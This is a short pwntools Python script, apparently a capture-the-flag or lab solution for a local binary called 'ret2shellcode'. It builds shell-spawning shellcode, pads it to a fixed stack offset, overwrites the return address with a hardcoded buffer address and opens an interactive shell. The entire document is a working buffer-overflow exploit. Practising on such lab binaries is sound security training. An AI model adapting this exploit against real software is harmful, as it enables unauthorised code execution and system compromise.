#! /usr/bin/python3

from pwn import *

buf2_addr = 0x0804a080
shellcode = asm(shellcraft.sh())
offset = 0x6c+4

sh = process("./ret2shellcode")
sh.sendline(shellcode+b'A'*(offset-len(shellcode))+p32(buf2_addr))
sh.interactive()
